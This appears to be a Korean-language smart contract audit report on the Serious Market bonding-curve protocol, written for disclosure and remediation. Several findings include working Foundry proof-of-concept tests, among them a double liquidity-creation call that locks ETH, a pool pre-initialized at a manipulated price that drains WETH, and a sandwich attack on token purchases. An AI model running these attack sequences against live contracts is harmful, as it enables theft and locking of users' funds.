# 소개

Pashov Audit Group은 업계 최고의 스마트 컨트랙트 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 1000건 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만드는 것을 목표로 합니다. 100% 보안은 결코 보장될 수 없지만, 경험 많은 연구원들이 귀하의 블록체인 프로토콜을 위해 최선을 다할 것을 보장합니다. [여기](https://github.com/pashov/audits)에서 이전 작업을 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 문의하십시오.

# 면책 조항

스마트 컨트랙트 보안 검토는 취약점의 완전한 부재를 검증할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로, 우리는 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장할 수 없으며, 검토가 스마트 컨트랙트의 문제를 발견할 것이라고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 서론

**serious-market/serious-core** 저장소에 대한 시간 제한이 있는 보안 검토가 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 컨트랙트 구현의 보안 측면에 중점을 두었습니다.

# Serious 소개

Serious Market 스마트 컨트랙트는 본딩 커브(bonding curve)에서 ERC20 토큰의 생성 및 거래를 용이하게 하고, 설정된 토큰 공급량을 관리하며, 본딩 커브 공식을 기반으로 토큰 가격을 계산하고, 사용자가 ETH로 이러한 토큰을 사고팔 수 있도록 합니다. 또한 유동성 공급을 위해 Uniswap과 통합됩니다.

# 리스크 분류

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 | 높음 | 중간 |
| **가능성: 중간** | 높음 | 중간 | 낮음 |
| **가능성: 낮음** | 중간 | 낮음 | 낮음 |

## 영향 (Impact)

- 높음 - 프로토콜 자산의 상당한 물질적 손실을 초래하거나 사용자 그룹에 심각한 피해를 줍니다.

- 중간 - 프로토콜 자산의 적당한 물질적 손실을 초래하거나 사용자 그룹에 적당한 피해를 줍니다.

- 낮음 - 프로토콜 자산의 경미한 물질적 손실을 초래하거나 소수의 사용자 그룹에 피해를 줍니다.

## 가능성 (Likelihood)

- 높음 - 온체인 조건을 모방한 합리적인 가정하에 공격 경로가 가능하며, 훔치거나 잃을 수 있는 자금의 양에 비해 공격 비용이 상대적으로 낮습니다.

- 중간 - 조건부로 인센티브가 있는 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.

- 낮음 - 가정이 너무 많거나 너무 비현실적이거나, 공격자가 인센티브가 거의 없거나 전혀 없는 상태에서 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치

- 치명적 (Critical) - 가능한 한 빨리 수정해야 합니다 (이미 배포된 경우).

- 높음 (High) - 수정해야 합니다 (배포 전이라면 배포 전에).

- 중간 (Medium) - 수정하는 것이 좋습니다.

- 낮음 (Low) - 수정할 수 있습니다.

# 보안 평가 요약

_검토 커밋 해시_ - [6c99daa6a532307015a277fdfdaddf2934ff0520](https://github.com/serious-market/serious-core/tree/6c99daa6a532307015a277fdfdaddf2934ff0520)

_수정 검토 커밋 해시_ - [55a46647225b58a2de9d2e4a997aace6d5870e10](https://github.com/serious-market/serious-core/tree/55a46647225b58a2de9d2e4a997aace6d5870e10)

### 범위

다음 스마트 컨트랙트들이 감사 범위에 포함되었습니다:

- `SeriousMarket`
- `ERC20Token`
- `PoolAddress`

# 발견 사항

# [C-01] `createPoolAndAddLiquidity`를 두 번 트리거하여 수집된 ETH 잠금

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

사용자가 Serious market에서 토큰을 생성할 때 `buyToken`을 호출하고 필요한 양의 ETH를 제공하여 자금을 조달할 수 있으며, 사용자는 요청한 양의 토큰을 받게 됩니다. 토큰이 완전히 펀딩될 때까지(`tokensSold >= tradeableSupply`), 수집된 ETH는 `SeriousMarketProtocol` 컨트랙트 내에 저장됩니다.

토큰이 완전히 펀딩되면 누구나 `createPoolAndAddLiquidity`를 호출하여 토큰과 weth 쌍의 UniV3 풀을 생성하고 구성된 `ethAmount` 및 `tokenAmount`를 기반으로 풀에 유동성을 추가할 수 있습니다.

```solidity
    function createPoolAndAddLiquidity(address tokenAddress) external nonReentrant returns (address) {
        TokenData memory tokenData = tokenDatas[tokenAddress];
        require(tokenData.token != ERC20Token(address(0)), "Token does not exist");
        require(tokenData.tokensSold >= tradeableSupply, "Not enough tokens sold to create pool");

        uint256 ethAmount = totalLiquidity - poolCreationReward;
        uint256 tokenAmount = _getFractionalTokens(reservedSupply);

        // Disable trading on token
        tokenDatas[tokenAddress].tradingEnabled = false;

        // Convert ETH from contract to WETH
        weth.deposit{value: ethAmount}();

        // Approve the router to spend tokens
        SafeTransferLib.safeApprove(tokenData.token, address(positionManager), tokenAmount);
        require(weth.approve(address(positionManager), ethAmount), "Failed to approve WETH");

        // Create the pool if it doesn't already exist
        address pool = uniswapFactory.getPool(address(weth), tokenAddress, poolFee);
        if (pool == address(0)) {
            pool = uniswapFactory.createPool(address(weth), tokenAddress, poolFee);
            uint160 sqrtPriceX96 = tokenAddress < address(weth) ? sqrtPriceX96WETHToken1 : sqrtPriceX96ERC20Token1;
            IUniswapV3Pool(pool).initialize(sqrtPriceX96);
        }

        // Mint parameters for providing liquidity
        // ...

        // Add liquidity
        (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) = positionManager.mint(params);

        // Burn the LP token -- don't use safe transfer because it's a contract that doesn't implement receiver
        positionManager.transferFrom(address(this), customNullAddress, tokenId);

        // ...
        return address(pool);
    }
```

그러나 `createPoolAndAddLiquidity`는 `tradingEnabled`를 false로 설정하기만 하고 이전 값이 true였는지 확인하지 않습니다. 이는 공격자가 다른 토큰의 수집된 ETH를 공격자의 풀에 잠그는 데 악용될 수 있습니다.

개념 증명(PoC):

1. 공격자는 토큰을 생성하고, 토큰을 완전히 펀딩한 다음, `createPoolAndAddLiquidity`를 호출할 수 있습니다.
2. 이 작업 후, 공격자는 `tokenAmount`를 커버할 만큼 충분한 토큰을 `SeriousMarketProtocol` 컨트랙트에 기부하고 `createPoolAndAddLiquidity`를 두 번째로 트리거합니다.
   다른 토큰에서 수집된 ETH는 공격자의 풀에 유동성을 제공하는 데 사용됩니다.

코드화된 PoC:

```solidity
    function testAddLiquidityTwice() public {

        uint256 buyAmount = seriousMarket.tradeableSupply();
        uint256 cost = seriousMarket.getEthValueForTradeWithFee(0, int256(buyAmount));
        // this is to mock initial balance inside the market from another token funding
        vm.deal(address(seriousMarket), cost);

        vm.startPrank(ownerAddress);
        vm.deal(ownerAddress, cost);
        console.log("initial eth balance of attacker : ");
        console.log(cost);
        console.log("balance of eth inside market before :");
        console.log(address(seriousMarket).balance);
        seriousMarket.buyToken{value: cost}(address(token), buyAmount, bytes8(0));
        seriousMarket.createPoolAndAddLiquidity(tokenAddress);

        console.log("balance of attacker after first add liquidity :");
        console.log(token.balanceOf(ownerAddress));

        // add liquidity twice
        uint256 reservedSupply = seriousMarket.reservedSupply() * (10 ** 18);
        token.transfer(address(seriousMarket), reservedSupply);
        seriousMarket.createPoolAndAddLiquidity(tokenAddress);
        // swap back to eth
        uint256 swapAmount = token.balanceOf(ownerAddress);
        IV3SwapRouter swapRouter = IV3SwapRouter(swapRouterAddress);
        ERC20(tokenAddress).approve(swapRouterAddress, swapAmount);
        IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter.ExactInputSingleParams({
            tokenIn: tokenAddress,
            tokenOut: wethAddress,
            fee: seriousMarket.poolFee(),
            recipient: ownerAddress,
            amountIn: swapAmount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        uint256 amountOut = swapRouter.exactInputSingle(params);
        console.log("Token balance of attacker after second addLiquidity :");
        console.log(token.balanceOf(ownerAddress));
        console.log("Eth balance of attacker after second addLiquidity :");
        console.log(address(ownerAddress).balance);
        console.log("Eth balance of seriousMarket after second addLiquidity :");
        console.log(address(seriousMarket).balance);
    }
```

테스트 실행:

```shell
forge test --match-test testAddLiquidityTwice -vvv
```

이것은 수익성 있는 공격은 아니지만, 다른 토큰의 자금 조달을 DoS(서비스 거부) 상태로 만들고 풀 및 유동성 생성을 커버할 ETH 유동성이 부족하여 프로토콜 지급 불능으로 이어질 수 있습니다.

## 권고 사항

`createPoolAndAddLiquidity` 내부에 추가 확인을 추가하십시오. `tradingEnabled`가 false이면 작업을 되돌리십시오(revert).

# [C-02] Uniswap 풀이 다른 가격으로 초기화될 수 있음

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

`SeriousMarket.createPoolAndAddLiquidity`는 풀이 존재하지 않는 경우에만 토큰-WETH 쌍에 대한 Uniswap 풀을 생성하고 초기화합니다. 그런 다음 현재 가격으로 풀에 유동성이 추가됩니다.

풀이 존재하고 현재 가격이 목표 초기 가격과 다른 경우, 모든 유동성이 풀에 추가되지 않습니다.

토큰 가격이 목표 가격보다 높으면 더 적은 토큰이 풀에 추가되고 남은 토큰은 소각됩니다. 가격이 낮으면 더 적은 WETH가 풀에 추가되고 남은 WETH는 컨트랙트에 갇히게 됩니다.

악의적인 사용자는 매우 높은 가격으로 풀을 생성하고 유동성이 추가된 후 소량의 토큰을 풀의 대부분의 WETH로 교환할 수 있습니다.

## 개념 증명

테스트:

```solidity
function testCreatePoolOutsideMarket() public {
    vm.deal(ownerAddress, 10 ether);
    vm.deal(userAddress, 1 ether);
    uint256 userInitialBalance = userAddress.balance;
    uint256 userBuyAmount = 1;

    // User buys 1 token and owner buys the rest
    buy(userAddress, userBuyAmount);
    buy(ownerAddress, seriousMarket.tradeableSupply() - userBuyAmount);

    vm.startPrank(ownerAddress);

    // Create pool and initialize with very high price
    address pool = IUniswapV3Factory(uniswapFactoryAddress).createPool(wethAddress, tokenAddress, seriousMarket.poolFee());
    IUniswapV3Pool(pool).initialize(1e40);

    // Add liquidity from market
    seriousMarket.createPoolAndAddLiquidity(tokenAddress);

    // Swap 1 token for WETH
    ERC20(tokenAddress).approve(swapRouterAddress, userBuyAmount * 1e18);
    IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter.ExactInputSingleParams({
    tokenIn: tokenAddress,
    tokenOut: wethAddress,
    fee: seriousMarket.poolFee(),
    recipient: ownerAddress,
    amountIn: userBuyAmount * 1e18,
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
    });
    uint256 amountOut = IV3SwapRouter(swapRouterAddress).exactInputSingle(params);

    vm.stopPrank();

    console2.log("ETH spent: %e", userInitialBalance - userAddress.balance);
    console2.log("WETH received: %e", amountOut);
}

function buy(address buyer, uint256 amount) public {
    (, uint256 tokensSold, ) = seriousMarket.tokenDatas(tokenAddress);
    uint256 buyCost = seriousMarket.getEthValueForTrade(int256(tokensSold), int256(amount));
    uint256 buyFee = seriousMarket.getBuyFee(buyCost);
    vm.prank(buyer);
    seriousMarket.buyToken{value: buyCost + buyFee}(address(token), amount, bytes8(0));
}
```

콘솔 출력:

```js
ETH spent: 1.010000015e9
WETH received: 7.031734957878102476e18
```

## 권고 사항

`createPoolAndAddLiquidity` 내부에서 토큰을 생성하고, 토큰이 생성되면 교환할 수 있는 토큰 청구(claim) 형태의 구매 및 판매에 대한 내부 회계를 사용하는 것을 고려하십시오.

풀이 생성되기 전에 토큰을 전송할 수 있도록 하는 또 다른 옵션은 풀이 생성되면 실제 토큰으로 교환할 수 있는 래퍼(wrapper) 토큰을 사용하는 것입니다.

사용자가 새 토큰 주소를 미리 계산하고 풀을 생성 및 초기화하는 프론트러닝 공격을 방지하려면 풀 존재 확인을 제거하고(풀이 이미 초기화된 경우 되돌려짐), `createPoolAndAddLiquidity`가 no-op(아무 작업도 안 함)이 되지 않도록 `create2`를 사용하여 토큰을 생성할 때 솔트(salt)를 전달해야 합니다.

# [M-01] buyToken()에 누락된 슬리피지 매개변수

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명

사용자는 `getEthValueForTradeWithFee()`를 호출하여 수수료를 포함하여 지정된 수의 토큰을 구매하는 데 필요한 정확한 양의 ETH를 검색할 수 있습니다.

토큰 판매 초기 단계에서는 사용자가 "동시에" 토큰을 구매하려고 할 가능성이 매우 높습니다. 즉, UI를 통해 정확한 금액을 검색하고 해당 값으로 `buyTokens()`에 트랜잭션을 전송하는 것입니다.

문제는 그 사이에 최소한의 가격 변동이라도 발생하면 슬리피지 매개변수가 없으므로 트랜잭션이 항상 되돌려진다는(revert) 것입니다.

```solidity
    // Get the cost of the trade in ETH and confirm the user has sent enough
    uint256 ethTradeValue = getEthValueForTrade(int256(tokenData.tokensSold), int256(amount));
    uint256 protocolFee = getBuyFee(ethTradeValue);
    uint256 totalEthValue = ethTradeValue + protocolFee;
@>  require(msg.value >= totalEthValue, "Not enough Ether sent");
```

이전 영향 외에도 프로토콜이 공개 멤풀이 있는 체인에 배포된 경우(프론트러닝 허용) 사용자는 샌드위치 공격의 대상이 될 수 있습니다. 예제는 개념 증명 섹션에 제공됩니다.

### 개념 증명

예상치 못한 되돌림(Revert) POC:

- `test/SeriousMarket.t.sol`에 테스트 추가
- `forge test --mt testBuyTokenUnexpectedRevert` 실행

```solidity
function testBuyTokenUnexpectedRevert() public {
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    // Both users request the tokensSold via a UI and get this value
    (,uint256 tokensSold,) = seriousMarket.tokenDatas(address(token));

    uint256 tokensAmount1 = 1;
    uint256 ethAmount1 = seriousMarket.getEthValueForTradeWithFee(int256(tokensSold), int256(tokensAmount1));

    uint256 tokensAmount2 = 100_000;
    uint256 ethAmount2 = seriousMarket.getEthValueForTradeWithFee(int256(tokensSold), int256(tokensAmount2));

    // The first user that gets their transactions processed from the mempool will succeed
    hoax(user1);
    seriousMarket.buyToken{value: ethAmount1}(address(token), tokensAmount1, bytes8(0));

    // But the second one will always fail, as the Ether amount will not be exactly as expected
    // (even though the price difference could be minimal)
    hoax(user2);
    vm.expectRevert("Not enough Ether sent");
    seriousMarket.buyToken{value: ethAmount2}(address(token), tokensAmount2, bytes8(0));
}
```

샌드위치 공격 POC:

```solidity
function testBuyTokenSandwich() public {
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    vm.deal(attacker, 100 ether);
    vm.deal(victim, 100 ether);

    vm.prank(attacker);
    token.approve(address(seriousMarket), type(uint256).max);

    // Track balance before the attack
    uint256 attackerBalanceBefore = attacker.balance;

    // The attacker frontruns the buyToken operation
    vm.prank(attacker);
    seriousMarket.buyToken{value: 10 ether}(address(token), 657_000_000 - 400_000_000, bytes8(0));

    // The victim's transaction is processed after the attacker one
    vm.prank(victim);
    seriousMarket.buyToken{value: 10 ether}(address(token), 400_000_000, bytes8(0));

    // The attacker completes the sandwich attack by executing a sellToken operation right after
    uint256 amount = token.balanceOf(attacker) / 1e18;
    vm.prank(attacker);
    seriousMarket.sellToken(address(token), amount, 0, 0, bytes8(0));

    // The took an unfair profit from a victim who paid more than expected for buying tokens
    uint256 attackerBalanceAfter = attacker.balance;
    assertGt(attackerBalanceAfter - attackerBalanceBefore, 3 ether);
}
```

## 권고 사항

`sellToken()`과 마찬가지로 사용자가 슬리피지 매개변수를 설정할 수 있도록 허용하십시오.

# [M-02] 마켓에서 구매한 최신 토큰이 풀보다 비쌈

## 심각도

**영향:** 낮음

**가능성:** 높음

## 설명

마켓에서 구매한 토큰의 가격은 `tokensSold`가 `tradeableSupply`에 접근함에 따라 증가합니다. 이는 마켓에서 구매한 마지막 토큰이 풀에서 구매한 첫 번째 토큰보다 약 1% 더 비싸다는 것을 의미합니다.

`tradeableSupply`가 모두 구매되면 풀이 생성된다는 점을 감안할 때, 다른 사용자가 마켓에서 마지막 토큰을 구매할 때까지 기다렸다가 풀에서 더 낮은 가격으로 구매할 인센티브가 있습니다.

### 개념 증명

테스트:

```solidity
function testBuyMarketVsPool() public {
    vm.deal(ownerAddress, 100 ether);
    vm.deal(userAddress, 100 ether);
    uint256 initialBalance = address(userAddress).balance;
    uint256 buyAmount = 1_000_000;

    buy(ownerAddress, seriousMarket.tradeableSupply() - buyAmount);
    buy(userAddress, buyAmount);
    console2.log("Cost in market: %e", initialBalance - address(userAddress).balance);

    vm.startPrank(userAddress);
    seriousMarket.createPoolAndAddLiquidity(tokenAddress);

    wethAddress.call{value: 10 ether}("");
    IV3SwapRouter swapRouter = IV3SwapRouter(swapRouterAddress);
    ERC20(wethAddress).approve(swapRouterAddress, type(uint256).max);

    IV3SwapRouter.ExactOutputSingleParams memory params = IV3SwapRouter.ExactOutputSingleParams({
        tokenIn: wethAddress,
        tokenOut: tokenAddress,
        fee: seriousMarket.poolFee(),
        recipient: ownerAddress,
        amountOut: buyAmount * 1e18,
        amountInMaximum: 10 ether,
        sqrtPriceLimitX96: 0
    });

    uint256 amountIn = swapRouter.exactOutputSingle(params);
    vm.stopPrank();

    console2.log("Cost in pool:   %e", amountIn);
}

function buy(address buyer, uint256 amount) public {
    (, uint256 tokensSold, ) = seriousMarket.tokenDatas(tokenAddress);
    uint256 buyCost = seriousMarket.getEthValueForTrade(int256(tokensSold), int256(amount));
    uint256 buyFee = seriousMarket.getBuyFee(buyCost);
    vm.prank(buyer);
    seriousMarket.buyToken{value: buyCost + buyFee}(address(token), amount, bytes8(0));
}
```

콘솔 출력:

```js
  Cost in market: 2.090195e16
  Cost in pool:   2.0768311772697743e16
```

## 권고 사항

마켓에서 구매한 마지막 토큰이 풀에서 구매한 첫 번째 토큰보다 비싸지 않도록 Uniswap 풀의 초기 가격을 조정하십시오.

# [L-01] 불필요한 슬리피지 확인

`sellToken`이 호출되면 사용자는 `estimatedEthReturned`에서 허용된 슬리피지 내에서 ETH를 받도록 `slippageBps`를 제공할 수 있습니다. 그러나 현재 `ethValueForUser`가 `estimatedEthReturned`와 같더라도 슬리피지를 확인합니다.

```solidity
    function sellToken(
        address tokenAddress,
        uint256 amount,
        uint256 estimatedEthReturned,
        uint256 slippageBps,
        bytes8 referralCode
    ) external {
        // ...

        // Check if the user is getting the expected amount of ETH
        // @audit - should be no equality here
>>>     if (ethValueForUser <= estimatedEthReturned) {
            require(
                estimatedEthReturned - ethValueForUser <= (estimatedEthReturned * slippageBps) / 10_000,
                "Slippage exceeded"
            );
        }
        // ...
     }
```

`ethValueForUser`가 `estimatedEthReturned`보다 낮은 경우에만 확인하도록 조건부 로직을 변경하십시오.

# [L-02] 추천인(Referrers)이 매수/매도 작업 차단 가능

추천인은 무신뢰(trustless) 방식으로 등록되며, 자신을 추천한 특정 사용자의 트랜잭션을 되돌리거나(revert) "가스 폭탄"을 통해 추가 가스를 소비하게 하는 등 `safeTransferETH()` 콜백에 대한 괴롭힘(griefing) 공격을 수행할 수 있습니다. 이는 `buyToken()` 및 `sellToken()` 함수 모두에 영향을 미칩니다.

```solidity
    function _transferReferralFee(bytes8 referralCode, uint256 protocolFeeValue) internal returns (address, uint256) {
        address referrer = referralCodeToAddress[referralCode];
        uint256 referralFee = 0;
        if (referrer != address(0)) {
            referralFee = getReferralFee(protocolFeeValue);
@>          SafeTransferLib.safeTransferETH(referrer, referralFee);
        }

        return (referrer, referralFee);
    }
```

추천인이 이로 인해 이익을 얻지 못할 수 있고 사용자가 이 추천인을 거부(opt-out)할 수 있지만, Solady의 [`forceSafeTransferETH()`](https://github.com/Vectorized/solady/blob/v0.0.201/src/utils/SafeTransferLib.sol#L106)와 같은 함수를 사용하여 가능한 모든 괴롭힘 공격을 방지하는 것이 좋습니다.

# [L-03] 프론트런에 의한 `createPoolAndAddLiquidity` DOS

## 심각도

**영향:** 중간

**가능성:** 중간

## 설명

풀을 생성하고 유동성을 추가하려면 `SeriousMarket.createPoolAndAddLiquidity`는 토큰의 모든 거래 가능한 공급량이 판매되어야 합니다.

```solidity
290     require(tokenData.tokensSold >= tradeableSupply, "Not enough tokens sold to create pool");
```

적어도 하나의 토큰을 보유한 악의적인 행위자는 하나의 토큰을 컨트랙트에 판매하여 `tokenData.tokensSold`를 감소시킴으로써 `createPoolAndAddLiquidity` 호출을 프론트러닝할 수 있으며, 이로 인해 `createPoolAndAddLiquidity`에 대한 다음 호출이 실패하게 됩니다.

`createPoolAndAddLiquidity` 호출자가 이를 방지할 수 있는 유일한 방법은 A) 모든 토큰을 소유하거나, B) `createPoolAndAddLiquidity`를 호출하기 바로 직전에 동일한 트랜잭션에서 모든 사용 가능한 토큰을 구매하는 것입니다.

## 권고 사항

가능한 해결책은 모든 거래 가능한 공급량이 구매되면 토큰 판매를 허용하지 않는 것입니다. 이 동작을 원하지 않는 경우 또 다른 옵션은 거래 가능한 공급량에 도달할 때마다 쿨다운 기간을 추가하여 토큰 판매를 허용하지 않는 것입니다. 이렇게 하면 `createPoolAndAddLiquidity` 호출자가 프론트러닝 당하지 않고 함수를 호출할 수 있는 충분한 시간을 확보할 수 있습니다.
